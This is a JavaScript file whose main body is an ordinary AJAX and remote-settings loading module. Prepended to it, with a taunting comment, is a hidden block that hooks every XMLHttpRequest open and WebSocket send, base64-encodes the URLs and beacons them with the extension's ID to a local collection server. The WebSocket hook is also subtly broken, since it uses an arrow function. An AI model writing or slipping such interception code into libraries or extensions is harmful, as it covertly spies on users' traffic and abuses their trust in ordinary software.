function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var EXPORTED_SYMBOLS = ['genericAJAX', 'genericLoadRemoteJson', 'genericLoadRemoteResource', 'genericLoadRemoteSettings'];
function genericAJAX(imports, options) {
    return new imports.Promise(function (resolve, reject) {
        if (!options.url)
            reject(new Error('XHR requires non-empty URL'));
        var xhr = new imports.XMLHttpRequest();
        xhr.open(options.method || 'GET', options.url, 'async' in options ? options.async : true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState === imports.XMLHttpRequest.DONE) {
                if (xhr.status === 200) {
                    resolve(xhr);
                }
                else {
                    reject(xhr.status);
                }
            }
        };
        if (options.mimeType)
            xhr.overrideMimeType(options.mimeType);
        if (options.responseType)
            xhr.responseType = options.responseType;
        if (options.timeout) {
            xhr.timeout = options.timeout;
            xhr.ontimeout = function (e) {
                reject(e);
            };
        }
        if (options.headers) {
            imports.Object.keys(options.headers).forEach(function (header) {
                xhr.setRequestHeader(header, options.headers[header]);
            });
        }
        xhr.send(options.data);
    });
}
function genericLoadRemoteResource(imports, url) {
    return genericAJAX(imports, { method: 'GET', url: url });
}
function genericLoadRemoteJson(imports, url) {
    return genericLoadRemoteResource(imports, url)
        .then(function (xhr) { return xhr.responseText; })
        .then(imports.JSON.parse);
}
function genericLoadRemoteSettings(imports, url, loadRemoteJsonOverride) {
    function parseSettings(settings) {
        if (settings && typeof settings === 'object' && !Array.isArray(settings)) {
            return imports.Promise.all(Object.keys(settings)
                .map(function (key) { return [key, settings[key]]; })
                .map(function (keyValue) {
                var results = /(.*)@/.exec(keyValue[0]), value = keyValue[1], key = results ? results[1] : keyValue[0], promise = results ? genericLoadRemoteSettings(imports, value, loadRemoteJsonOverride) : parseSettings(value);
                return promise.then(function (value2) { return [key, value2]; });
            })).then(function (promises) {
                return promises.reduce(function (out, keyValue) {
                    out[keyValue[0]] = keyValue[1];
                    return out;
                }, {});
            });
        }
        else {
            return imports.Promise.resolve(settings);
        }
    }
    return (loadRemoteJsonOverride ? loadRemoteJsonOverride(url) : genericLoadRemoteJson(imports, url))
        .then(function (settings) { return parseSettings(settings); });
}
